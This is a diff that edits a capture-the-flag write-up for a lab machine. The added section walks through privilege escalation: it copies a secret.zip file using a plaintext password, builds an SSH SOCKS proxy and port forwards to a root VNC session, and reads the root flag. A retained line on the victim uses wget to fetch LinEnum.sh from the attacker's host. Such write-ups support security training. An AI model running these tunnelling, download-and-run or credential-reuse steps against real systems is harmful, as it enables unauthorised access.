@@ -837,6 +837,103 @@ cat user.txt
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 
+Privilege Escalation
+
+
+
+
+
+In our ssh session:
+
+
+cd
+
+
+ls
+
+
+
+we can see the secret.zip file
+
+
+
+
+
+On our host machine:
+
+
+cd Desktop
+
+scp charix@10.129.1.254:secret.zip .
+
+
+Password: Charix!2#4%6&8(0
+
+
+we downloaded file to our Desktop
+
+
+unzip secret.zip
+
+
+
+[secret.zip] secret password:    Charix!2#4%6&8(0
+
+
+
+
+and we see the some garbage inside: œš[|Õz!
+
+
+
+
+
+
+ps aux
+
+
+ps auxw | less -w
+
+
+/vnc
+
+
+netstat -an | grep LIST
+
+
+on our host:
+
+sudo nano /etc/proxychains4.conf
+
+
+[ProxyList]
+# add proxy here ...
+# meanwile
+# defaults set to "tor"
+socks5  127.0.0.1 1080
+
+
+
+ssh -D 1080 -L6801:127.0.0.1:5801 -L6901:127.0.0.1:5901 charix@10.129.1.254
+
+
+
+
+in new terminal:
+
+
+
+vncviewer -passwd secret 127.0.0.1::6901
+
+
+ls
+
+cat root.txt
+
+We have the flag!
+
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 Another Exploitation Way
 
@@ -969,46 +1066,7 @@ as we can see, we cant write a file, only root can, so we need to have the root 
 
 
 
-In our ssh session:
 
-
-cd
-
-
-ls
-
-
-
-we can see the secret.zip file
-
-
-
-
-
-On our host machine:
-
-
-cd Desktop
-
-scp charix@10.129.1.254:secret.zip .
-
-
-Password: Charix!2#4%6&8(0
-
-
-we downloaded file to our Desktop
-
-
-unzip secret.zip
-
-
-
-[secret.zip] secret password:    Charix!2#4%6&8(0
-
-
-
-
-and we see the some garbage inside: œš[|Õz!
 
 
 
@@ -1032,7 +1090,6 @@ On the victims via ssh session:
 cd /tmp
 
 
-
 wget 10.10.14.94:8000/LinEnum.sh
 
 
@@ -1042,10 +1099,95 @@ bash LinEnum.sh
 
 bash: Command not found
 
+
+
+
+
+
+
+lets create ssh tunnel to this port
+
+
+https://www.sans.org/blog/using-the-ssh-konami-code-ssh-control-sequences
+
+
+~C        - open a command line
+
+
+if command line disabled, on our host
+
+
+nano ~/.ssh/config
+
+
+past this:
+
+Host *
+    PermitLocalCommand yes
+    EnableEscapeCommandline yes
+
+
+save
+
+on victim break the active session:
+
+~.
+
+
+connect again and type:
+
+~C
+
+
+in the ssh>:
+
+-D 1080    - port forwarding
+
+
+check on our host:
+
+netstat -anlp | grep 1080
+
+
+(Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.)
+tcp        0      0 127.0.0.1:1080          0.0.0.0:*               LISTEN      14327/ssh           
+tcp6       0      0 ::1:1080                :::*                    LISTEN      14327/ssh           
+
+
+
+
+
+on our host:
+
+sudo nano /etc/proxychains4.conf
+
+
+[ProxyList]
+# add proxy here ...
+# meanwile
+# defaults set to "tor"
+socks5  127.0.0.1 1080
+
+
+
+ssh -D 1080 -L6801:127.0.0.1:5801 -L6901:127.0.0.1:5901 charix@10.129.1.254
+
+
+
+vncviewer -passwd secret 127.0.0.1::6901
+
+
+ls
+
+cat root.txt
+
+We have the flag!
+
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 
-Privilege Escalation
+
 
 
 
